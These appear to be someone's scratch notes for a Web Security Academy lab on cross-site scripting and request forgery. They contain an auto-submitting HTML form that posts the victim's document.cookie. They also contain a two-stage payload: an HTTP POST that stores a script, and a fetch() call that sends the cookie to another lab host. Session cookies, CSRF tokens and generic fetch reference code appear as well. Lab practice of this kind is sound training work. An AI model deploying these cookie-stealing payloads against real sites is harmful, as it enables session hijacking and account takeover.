try with form:

<html>
    <body>
        <form action="https://0ad4003604d0940bc05d4b7900740082.web-security-academy.net/post/comment" method="POST">
            <input type="hidden" name="csrf" value="GI15EGc1R1RwazbpEXK6orfpXB3ZsYil" />
            <input type="hidden" name="postId" value="8" />
            <input type="hidden" name="comment" value=document.cookie />
            <input type="hidden" name="name" value="blah" />
            <input type="hidden" name="email" value="email@new.com" />
            <input type="hidden" name="website" value="" />
        </form>
        <script>
            document.forms[0].submit();
        </script>
    </body>
</html>

try with fetch:

# stage 1 messege ():

POST /post/comment HTTP/1.1
Host: 0ab800b903ca83ecc0341072005e00d4.web-security-academy.net
Cookie: session=suzGSrRzvVhKcDre3ZRPrARNLpyJdwre
Content-Type: application/x-www-form-urlencoded
Content-Length: 1627
Connection: close

csrf=jYdqhkPTjkIQQvfuOXrix2ZkVqan0hWV&postId=4&comment={URLencodedSTAGE2script}&name=attacker&email=lets%40play.com&website=

# stage 2 script

<script>
    console.log('try:_____working' + document.cookie);
    fetch('https://0a09000703348ef9c1906dbf009b0002.web-security-academy.net/post/comment', {
        method: 'POST',
        mode: 'no-cors',
        headers: {'Content-Type': 'application/x-www-form-urlencoded', 'Cookie': 'session=Dkxb2I5Suc51HqgeR3ZHrnykSWO88zwu'}, 
        body: 'csrf=2EoZLgp2APbiyAYOZgZ1nZmwQNBiNbHs&postId=8&name=lll&email=attacker%40gmail.com&website=&comment=' + document.cookie
});
</script>

KvzezunXTtfZt12s41XvU3i2DKDWoBX8


' + document.cookie + '

original session in burp
Cookie: session=suzGSrRzvVhKcDre3ZRPrARNLpyJdwre

browser console.log:
csrf=jYdqhkPTjkIQQvfuOXrix2ZkVqan0hWV&postId=console.log&name=session=suzGSrRzvVhKcDre3ZRPrARNLpyJdwre


########################
materials:

// There were no quick access to mode and credentials to other fetch answers.
// Data you'll be sending
const data = { funny: "Absolutely not", educational: "yas" }

fetch('https://example.com/api/', {
  method: 'POST', // The method
  mode: 'no-cors', // It can be no-cors, cors, same-origin
  credentials: 'same-origin', // It can be include, same-origin, omit
  headers: {
    'Content-Type': 'application/json', // Your headers
  },
  body: JSON.stringify(data),
}).then(returnedData => {
  // Do whatever with returnedData
}).catch(err => {
  // In case it errors.
})